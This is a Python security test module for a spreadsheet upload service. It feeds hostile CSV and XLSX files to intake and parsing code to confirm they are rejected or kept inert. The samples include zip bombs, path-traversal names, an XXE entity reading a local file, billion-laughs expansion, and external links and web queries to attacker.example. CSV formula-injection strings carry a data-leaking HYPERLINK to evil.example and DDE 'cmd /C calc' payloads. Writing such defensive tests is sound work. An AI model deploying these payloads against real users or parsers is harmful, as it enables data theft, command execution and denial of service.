"""Hostile CSV / XLSX files against intake inspection and the sandbox parser.

``inspect_file`` runs at intake, before an upload is registered; ``parse_upload``
runs in the sandbox worker. Both are fed files an attacker controls byte for
byte (see ``tests.security.hostile_files``): compression bombs, entry floods,
encrypted, macro-bearing, traversal and symlink members, OLE documents,
archives whose headers lie, XML entity attacks, external links and sparse
worksheets; CSV with NUL bytes, invalid UTF-8, a BOM, oversized fields and
formulas. Uploads are never extracted to disk: openpyxl reads members by name.
"""

from __future__ import annotations

import codecs
import contextlib
import csv
import socket
import stat
from collections.abc import Callable, Iterator
from pathlib import Path
from typing import Any, NoReturn

import pytest
from openpyxl.worksheet._read_only import ReadOnlyWorksheet

from nexusflow.core.errors import InvalidInputError
from nexusflow.domain.sources.model import FileUploadConfig
from nexusflow.domain.uploads.model import MAX_XLSX_ENTRIES, UploadFormat, inspect_file
from nexusflow.infrastructure.files.parsers import MAX_CELL_CHARS, ParsedFile, parse_upload
from tests.security.hostile_files import (
    CFB_DOCUMENT,
    HEADER_ROW,
    SHEET,
    VBA_PROJECT_REL,
    VBA_PROJECT_TYPE,
    RawEntry,
    add_override,
    add_relationship,
    cfb_document,
    csv_bytes,
    empty_file,
    encrypted_sheet,
    inline_row,
    lying_sheet,
    macro_enabled_parts,
    ratio_bomb,
    sheet_xml,
    sparse_sheet,
    too_many_entries,
    total_size_bomb,
    truncated_workbook,
    with_entry_count,
    with_member,
    workbook,
    workbook_parts,
)

pytestmark = pytest.mark.security

XLSX = FileUploadConfig(format="xlsx", column_mapping={"sku": "SKU", "title": "Title"})
CSV = FileUploadConfig(format="csv", column_mapping={"sku": "SKU", "title": "Title"})
ROWS = [{"sku": "A-1", "title": "Widget"}]
SECRET = "TOP-SECRET-FILE-CONTENT"
CHUNK = 64 * 1024  # the CSV inspector reads files in chunks of this size
EXPANDED = "lol" * 1000  # found in any output that expanded the entity payloads below

type Builder = Callable[[], bytes]
type PathBuilder = Callable[[Path], bytes]


def _write(tmp_path: Path, data: bytes, fmt: UploadFormat) -> Path:
    path = tmp_path / f"upload.{fmt}"
    path.write_bytes(data)
    return path


def _rejection(path: Path, fmt: UploadFormat) -> str | None:
    """The ``upload_*`` code intake rejects the file with, or None if it passes."""
    try:
        inspect_file(path, expected=fmt)
    except InvalidInputError as exc:
        return exc.code
    return None


def _parse(path: Path, fmt: UploadFormat = "xlsx", *, max_rows: int = 100) -> ParsedFile:
    return parse_upload(path, XLSX if fmt == "xlsx" else CSV, max_rows=max_rows, max_columns=50)


def _row_2(cell_xml: str) -> bytes:
    return sheet_xml(HEADER_ROW + f'<row r="2">{cell_xml}</row>')


def _entity(level: int) -> str:
    body = f"&lol{level - 1};" * 10
    return f'<!ENTITY lol{level} "{body}">'


# "Billion laughs", scaled down to 10^5 repetitions: observable if ever expanded,
# harmless for the test process if a regression really did expand it.
LAUGHS = '<!ENTITY lol0 "lol">' + "".join(_entity(level) for level in range(1, 6))


def _xxe_in_worksheet(tmp_path: Path) -> bytes:
    secret = tmp_path / "secret.txt"
    secret.write_text(SECRET, encoding="utf-8")
    doctype = f'<!DOCTYPE worksheet [<!ENTITY xxe SYSTEM "{secret.as_uri()}">]>'
    cell = '<c r="A2" t="inlineStr"><is><t>&xxe;</t></is></c>'
    return workbook(workbook_parts(doctype.encode() + _row_2(cell)))


def _laughs_in_worksheet(tmp_path: Path) -> bytes:
    doctype = f"<!DOCTYPE worksheet [{LAUGHS}]>"
    cell = '<c r="A2" t="inlineStr"><is><t>&lol5;</t></is></c>'
    return workbook(workbook_parts(doctype.encode() + _row_2(cell)))


def _laughs_in_shared_strings(tmp_path: Path) -> bytes:
    parts = workbook_parts(_row_2('<c r="A2" t="s"><v>0</v></c>'))
    parts["xl/sharedStrings.xml"] = (
        f"<!DOCTYPE sst [{LAUGHS}]>"
        '<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        "<si><t>&lol5;</t></si></sst>"
    ).encode()
    add_override(
        parts,
        "/xl/sharedStrings.xml",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml",
    )
    add_relationship(
        parts,
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings",
        "sharedStrings.xml",
    )
    return workbook(parts)


def _truncated_worksheet_xml(tmp_path: Path) -> bytes:
    return workbook(workbook_parts(b'<worksheet><sheetData><row r="1"><c'))


def _missing_worksheet(tmp_path: Path) -> bytes:
    parts = workbook_parts()
    del parts[SHEET]
    return workbook(parts)


def _external_links_and_web_queries() -> bytes:
    cells = (
        '<c r="A2" t="str"><f>WEBSERVICE("http://attacker.example/x")</f><v>cached-sku</v></c>'
        '<c r="B2"><f>[1]Sheet1!A1*2</f><v>42</v></c>'
    )
    parts = workbook_parts(_row_2(cells))
    parts["xl/externalLinks/externalLink1.xml"] = (
        b'<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
        b' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        b'<externalBook r:id="rId1"/></externalLink>'
    )
    parts["xl/externalLinks/_rels/externalLink1.xml.rels"] = (
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Target="http://attacker.example/book.xlsx" TargetMode='
        b'"External" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        b'relationships/externalLinkPath"/></Relationships>'
    )
    parts["xl/connections.xml"] = (
        b'<connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        b'<connection id="1" name="q" type="4" refreshOnLoad="1">'
        b'<webPr url="http://attacker.example/data"/></connection></connections>'
    )
    add_override(
        parts,
        "/xl/externalLinks/externalLink1.xml",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml",
    )
    add_relationship(
        parts,
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink",
        "externalLinks/externalLink1.xml",
    )
    add_override(
        parts,
        "/xl/connections.xml",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml",
    )
    add_relationship(
        parts,
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/connections",
        "connections.xml",
        rel_id="rIdConnections",
    )
    parts["xl/workbook.xml"] = parts["xl/workbook.xml"].replace(
        b"</sheets>",
        b"</sheets><externalReferences><externalReference xmlns:r="
        b'"http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
        b' r:id="rIdHostile"/></externalReferences>',
    )
    return workbook(parts)


class TestXlsxArchiveInspection:
    def test_a_genuine_workbook_passes_and_parses(self, tmp_path: Path) -> None:
        # The baseline every hostile variant below is derived from.
        path = _write(tmp_path, workbook(), "xlsx")
        assert _rejection(path, "xlsx") is None
        assert _parse(path).items == ROWS

    @pytest.mark.parametrize("name", ["xl/workbook.xml", "XL/Workbook.XML"])
    def test_two_parts_with_one_name_are_rejected(self, tmp_path: Path, name: str) -> None:
        # Which of the two a reader takes is up to the reader: intake and the
        # parser could look at different content.
        path = _write(tmp_path, with_member(name, b"<workbook/>"), "xlsx")
        assert _rejection(path, "xlsx") == "upload_duplicate_entries"

    @pytest.mark.parametrize(
        "build",
        [
            pytest.param(ratio_bomb, id="1000-to-1-member"),
            pytest.param(total_size_bomb, id="members-each-exempt-from-the-ratio-check"),
        ],
    )
    def test_compression_bombs_are_rejected_without_inflating_anything(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, build: Builder
    ) -> None:
        data = build()
        assert len(data) < 512 * 1024  # inflates to 4 MiB / more than 200 MiB

        def no_inflating(*args: object, **kwargs: object) -> NoReturn:
            raise AssertionError("inspection decompressed a member")

        monkeypatch.setattr("zipfile.ZipExtFile.read", no_inflating)
        assert _rejection(_write(tmp_path, data, "xlsx"), "xlsx") == "upload_zip_bomb"

    def test_members_inflate_only_to_their_vetted_declared_size(self, tmp_path: Path) -> None:
        # Inspection trusts declared sizes. The worksheet's headers describe its few
        # hundred bytes of XML, but its DEFLATE stream holds 4 MiB of NUL bytes more:
        # had a single one of them been inflated, the worksheet would not parse.
        path = _write(tmp_path, lying_sheet(), "xlsx")
        assert _rejection(path, "xlsx") is None
        assert _parse(path).items == ROWS

    @pytest.mark.parametrize(
        ("build", "code"),
        [
            pytest.param(lambda: with_entry_count(MAX_XLSX_ENTRIES), None, id="at-the-cap"),
            pytest.param(too_many_entries, "upload_too_many_entries", id="one-over"),
        ],
    )
    def test_the_number_of_members_is_capped(
        self, tmp_path: Path, build: Builder, code: str | None
    ) -> None:
        assert _rejection(_write(tmp_path, build(), "xlsx"), "xlsx") == code

    def test_encrypted_members_are_rejected(self, tmp_path: Path) -> None:
        path = _write(tmp_path, encrypted_sheet(), "xlsx")
        assert _rejection(path, "xlsx") == "upload_encrypted"

    @pytest.mark.parametrize(
        "name",
        ["xl/vbaProject.bin", "XL/VBAPROJECT.BIN", "xl/activeX/activeX1.xml", "xl/activeX/x.bin"],
    )
    def test_vba_projects_and_activex_controls_are_rejected(
        self, tmp_path: Path, name: str
    ) -> None:
        path = _write(tmp_path, with_member(name, CFB_DOCUMENT), "xlsx")
        assert _rejection(path, "xlsx") == "upload_macro"

    # Excel finds a VBA project by the package's content types and relationships.
    @pytest.mark.parametrize("renamed_vba_project", [False, True], ids=["xlsm", "renamed-vba"])
    def test_macro_enabled_workbooks_are_rejected(
        self, tmp_path: Path, renamed_vba_project: bool
    ) -> None:
        parts = macro_enabled_parts()  # the main part is declared macro-enabled (.xlsm)
        if renamed_vba_project:  # Excel finds the project by relationship, not by name
            parts["xl/project.bin"] = CFB_DOCUMENT
            add_override(parts, "/xl/project.bin", VBA_PROJECT_TYPE)
            add_relationship(parts, VBA_PROJECT_REL, "project.bin")
        path = _write(tmp_path, workbook(parts), "xlsx")
        assert _rejection(path, "xlsx") == "upload_macro"

    @pytest.mark.parametrize(
        "name",
        [
            "../evil.xml",
            "xl/../../evil.xml",
            "/etc/cron.d/evil",
            "..\\..\\evil.xml",
            "xl\\..\\..\\evil.xml",
            "\\evil.xml",
            "\\\\server\\share\\evil.xml",
        ],
    )
    def test_path_traversal_member_names_are_rejected(self, tmp_path: Path, name: str) -> None:
        path = _write(tmp_path, with_member(name), "xlsx")
        assert _rejection(path, "xlsx") == "upload_path_traversal"

    def test_symlink_members_never_expose_their_target(self, tmp_path: Path) -> None:
        # The worksheet member is a Unix symlink to a worksheet on the parsing host:
        # were the archive extracted, or links resolved, that worksheet's rows would leak.
        target = tmp_path / "target-sheet.xml"
        target.write_bytes(sheet_xml(HEADER_ROW + inline_row(2, [SECRET, "leak"])))
        link = RawEntry(SHEET, str(target).encode(), unix_mode=stat.S_IFLNK | 0o777)
        path = _write(tmp_path, workbook(overrides={SHEET: link}), "xlsx")
        try:
            inspect_file(path, expected="xlsx")
            parsed = _parse(path)
        except (InvalidInputError, ValueError, SyntaxError) as exc:
            assert SECRET not in str(exc)
        else:
            assert SECRET not in repr(parsed.items)

    @pytest.mark.parametrize(
        ("fmt", "code"), [("xlsx", "upload_type_mismatch"), ("csv", "upload_binary")]
    )
    def test_ole_compound_documents_are_rejected(
        self, tmp_path: Path, fmt: UploadFormat, code: str
    ) -> None:
        # Legacy .xls and Office-*encrypted* .xlsx files are OLE containers, not ZIPs.
        assert _rejection(_write(tmp_path, cfb_document(), fmt), fmt) == code

    @pytest.mark.parametrize(
        ("build", "code"),
        [
            pytest.param(csv_bytes, "upload_type_mismatch", id="csv-text"),
            pytest.param(empty_file, "upload_type_mismatch", id="empty"),
            pytest.param(
                lambda: workbook({"META-INF/MANIFEST.MF": b"Main-Class: Evil\n"}),
                "upload_type_mismatch",
                id="zip-without-workbook-parts",
            ),
            pytest.param(truncated_workbook, "upload_corrupt", id="truncated-archive"),
        ],
    )
    def test_anything_but_a_workbook_container_is_rejected(
        self, tmp_path: Path, build: Builder, code: str
    ) -> None:
        assert _rejection(_write(tmp_path, build(), "xlsx"), "xlsx") == code


class TestXlsxParsing:
    @pytest.mark.parametrize(
        "build",
        [
            pytest.param(_xxe_in_worksheet, id="external-entity"),
            pytest.param(_laughs_in_worksheet, id="entity-expansion-in-worksheet"),
            pytest.param(_laughs_in_shared_strings, id="entity-expansion-in-shared-strings"),
        ],
    )
    def test_xml_entities_are_never_resolved(self, tmp_path: Path, build: PathBuilder) -> None:
        path = _write(tmp_path, build(tmp_path), "xlsx")
        try:
            parsed = _parse(path)
        except (InvalidInputError, ValueError) as exc:
            output = f"{exc} {exc.__cause__}"
        else:
            output = repr(parsed.items)
        assert SECRET not in output
        assert EXPANDED not in output

    @pytest.mark.parametrize(
        "build",
        [
            pytest.param(_xxe_in_worksheet, id="external-entity"),
            pytest.param(_laughs_in_worksheet, id="entity-expansion-in-worksheet"),
            pytest.param(_laughs_in_shared_strings, id="entity-expansion-in-shared-strings"),
            pytest.param(_truncated_worksheet_xml, id="malformed-worksheet-xml"),
            pytest.param(_missing_worksheet, id="missing-worksheet-part"),
        ],
    )
    def test_hostile_workbook_content_is_rejected_with_an_upload_code(
        self, tmp_path: Path, build: PathBuilder
    ) -> None:
        path = _write(tmp_path, build(tmp_path), "xlsx")
        assert _rejection(path, "xlsx") is None  # a well-formed container: intake passes it
        with pytest.raises(InvalidInputError) as exc:
            _parse(path)
        assert exc.value.code.startswith("upload_")

    def test_rows_beyond_the_cap_are_not_read(self, tmp_path: Path) -> None:
        rows = "".join(inline_row(n, [f"A-{n}", "W"]) for n in range(2, 14))
        path = _write(tmp_path, workbook(workbook_parts(sheet_xml(HEADER_ROW + rows))), "xlsx")
        parsed = _parse(path, max_rows=5)
        assert (parsed.rows, parsed.truncated) == (5, True)
        assert [item["sku"] for item in parsed.items] == [f"A-{n}" for n in range(2, 7)]

    def test_columns_beyond_the_cap_are_never_read(self, tmp_path: Path) -> None:
        # The mapped "Title" column sits in column 62, past the 50-column cap: the
        # parser does not read that far, so the workbook cannot supply it.
        header = inline_row(1, ["SKU", *(f"pad{i}" for i in range(60)), "Title"])
        row = inline_row(2, ["A-1", *("x" * 60), "Widget"])
        path = _write(tmp_path, workbook(workbook_parts(sheet_xml(header + row))), "xlsx")
        with pytest.raises(InvalidInputError) as exc:
            _parse(path)
        assert exc.value.code in {"upload_missing_columns", "upload_too_many_columns"}

    def test_external_links_and_web_queries_are_never_fetched(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        attempts: list[str] = []

        def refuse(*args: object, **kwargs: object) -> NoReturn:
            attempts.append(repr(args[:2]))
            raise OSError("no network while parsing uploads")

        monkeypatch.setattr(socket, "getaddrinfo", refuse)
        monkeypatch.setattr(socket, "create_connection", refuse)
        monkeypatch.setattr(socket.socket, "connect", refuse)

        parsed = _parse(_write(tmp_path, _external_links_and_web_queries(), "xlsx"))

        # Cached values are plain data: nothing was evaluated, resolved or fetched.
        assert parsed.items == [{"sku": "cached-sku", "title": 42}]
        assert attempts == []

    def test_sparse_row_numbers_do_not_make_the_parser_walk_the_gap(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        budget = 10_000  # generous for max_rows=10; the file below claims a million rows
        walked = 0
        iter_rows: Callable[..., Iterator[Any]] = ReadOnlyWorksheet.iter_rows

        def counting(sheet: ReadOnlyWorksheet, *args: Any, **kwargs: Any) -> Iterator[Any]:
            nonlocal walked
            for row in iter_rows(sheet, *args, **kwargs):
                walked += 1
                assert walked <= budget, f"walked {walked:,} rows of a 5 KB file"
                yield row

        monkeypatch.setattr(ReadOnlyWorksheet, "iter_rows", counting)
        data = sparse_sheet(1_048_576)  # Excel's last row; openpyxl accepts any r=
        assert len(data) < 10_000
        path = _write(tmp_path, data, "xlsx")
        assert _rejection(path, "xlsx") is None  # nothing for intake to see
        with contextlib.suppress(InvalidInputError):  # refusing the file is a valid fix
            _parse(path, max_rows=10)


class TestCsvInspection:
    @pytest.mark.parametrize(
        "data",
        [
            pytest.param(b"\x00SKU,Title\r\n", id="first-byte"),
            pytest.param(b"SKU\x00,Title\r\nA-1,x\r\n", id="header"),
            pytest.param(b"SKU,Title\r\n" + b"A-1,x\r\n" * 2000 + b"B,\x00\r\n", id="middle"),
            pytest.param(b"SKU,Title\r\nA-1," + b"x" * CHUNK + b"\x00\r\n", id="second-chunk"),
            pytest.param(b"SKU,Title\r\nA-1,x\r\n\x00", id="last-byte"),
            pytest.param("SKU,Title\r\n".encode("utf-16"), id="utf-16"),
        ],
    )
    def test_nul_bytes_are_rejected_wherever_they_are(self, tmp_path: Path, data: bytes) -> None:
        assert _rejection(_write(tmp_path, data, "csv"), "csv") == "upload_binary"

    @pytest.mark.parametrize(
        "data",
        [
            pytest.param(b"SKU,Title\r\nA-1,caf\xe9\r\n", id="latin-1"),
            pytest.param(b"SKU,Title\r\nA-1,\x80\r\n", id="lone-continuation-byte"),
            pytest.param(b"SKU,Title\r\nA-1,\xc0\xaf\r\n", id="overlong-slash"),
            pytest.param(b"SKU,Title\r\nA-1,\xed\xa0\x80\r\n", id="encoded-surrogate"),
            pytest.param(b"SKU,Title\r\nA-1,\xf4\x90\x80\x80\r\n", id="beyond-u10ffff"),
            pytest.param(b"SKU,Title\r\nA-1,x\xe2\x82", id="truncated-at-eof"),
            pytest.param(b"SKU,Title\r\nA-1," + b"x" * CHUNK + b"\xff\r\n", id="second-chunk"),
        ],
    )
    def test_invalid_utf8_is_rejected(self, tmp_path: Path, data: bytes) -> None:
        assert _rejection(_write(tmp_path, data, "csv"), "csv") == "upload_encoding"

    def test_characters_split_across_read_chunks_are_valid(self, tmp_path: Path) -> None:
        header = b"Pad,SKU,Title\r\n"
        # An unmapped padding column pushes the emoji across the first chunk border.
        pad = b"x" * (CHUNK - 2 - len(header) - len(b",A-1,"))
        emoji = chr(0x1F600)  # four bytes in UTF-8
        data = header + pad + b",A-1," + emoji.encode() + b"\r\n"
        assert data.index(emoji.encode()) == CHUNK - 2
        path = _write(tmp_path, data, "csv")
        assert _rejection(path, "csv") is None
        assert _parse(path, "csv").items == [{"sku": "A-1", "title": emoji}]

    @pytest.mark.parametrize(
        "data",
        [
            pytest.param(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n", id="pdf"),
            pytest.param(b"MZ\x90\x00\x03\x00\x00\x00This program", id="windows-executable"),
            pytest.param(b"\x7fELF\x02\x01\x01\x00", id="elf"),
            pytest.param(b"\x1f\x8b\x08\x00\x00\x00\x00\x00", id="gzip"),
            pytest.param(b"PK\x03\x04SKU,Title\r\n", id="zip"),
            pytest.param(b"\xca\xfe\xba\xbe\x00\x00\x00\x34", id="java-class"),
        ],
    )
    def test_binary_formats_disguised_as_csv_are_rejected(
        self, tmp_path: Path, data: bytes
    ) -> None:
        assert _rejection(_write(tmp_path, data, "csv"), "csv") == "upload_type_mismatch"


class TestCsvParsing:
    def test_an_empty_file_is_refused_at_intake(self, tmp_path: Path) -> None:
        assert _rejection(_write(tmp_path, b"", "csv"), "csv") == "upload_empty"

    def test_every_row_obeys_the_column_cap(self, tmp_path: Path) -> None:
        wide = ",".join(["A-2", "Widget", *("x" * 60)]).encode()
        path = _write(tmp_path, b"SKU,Title\r\nA-1,Widget\r\n" + wide + b"\r\n", "csv")
        with pytest.raises(InvalidInputError) as exc:
            _parse(path, "csv")  # 50 columns at most
        assert exc.value.code == "upload_too_many_columns"

    def test_a_utf8_bom_is_accepted_and_stripped(self, tmp_path: Path) -> None:
        path = _write(tmp_path, codecs.BOM_UTF8 + b"SKU,Title\r\nA-1,Widget\r\n", "csv")
        assert _rejection(path, "csv") is None
        assert _parse(path, "csv").items == ROWS  # a kept BOM would hide the SKU column

    def test_formula_cells_stay_inert_text(self, tmp_path: Path) -> None:
        formulas = [
            ("=1+1", '=HYPERLINK("http://evil.example/?leak="&A1,"click")'),
            ("+cmd|' /C calc'!A0", "-2+3"),
            ("@SUM(A1:A9)", '\t=DDE("cmd";"/C calc";"x")'),
        ]
        quoted = [",".join('"' + v.replace('"', '""') + '"' for v in row) for row in formulas]
        path = _write(tmp_path, "\r\n".join(["SKU,Title", *quoted]).encode(), "csv")
        assert _rejection(path, "csv") is None
        # The literal strings come back: nothing is evaluated, stripped or re-escaped
        # here (report and export renderers neutralise formulas on the way out).
        assert _parse(path, "csv").items == [{"sku": s, "title": t} for s, t in formulas]

    def test_a_field_beyond_the_csv_field_limit_is_malformed(self, tmp_path: Path) -> None:
        huge = "x" * (csv.field_size_limit() + 1)
        path = _write(tmp_path, f'SKU,Title\r\nA-1,"{huge}"\r\n'.encode(), "csv")
        assert _rejection(path, "csv") is None  # plain UTF-8 text: the parser bounds it
        with pytest.raises(InvalidInputError) as exc:
            _parse(path, "csv")
        assert exc.value.code == "upload_malformed"

    @pytest.mark.parametrize("fmt", ["csv", "xlsx"])
    def test_long_cells_are_truncated_to_the_cell_cap(
        self, tmp_path: Path, fmt: UploadFormat
    ) -> None:
        value = "y" * (MAX_CELL_CHARS * 5)
        if fmt == "csv":
            data = f"SKU,Title\r\nA-1,{value}\r\n".encode()
        else:
            data = workbook(workbook_parts(sheet_xml(HEADER_ROW + inline_row(2, ["A-1", value]))))
        [row] = _parse(_write(tmp_path, data, fmt), fmt).items
        assert row["title"] == "y" * MAX_CELL_CHARS
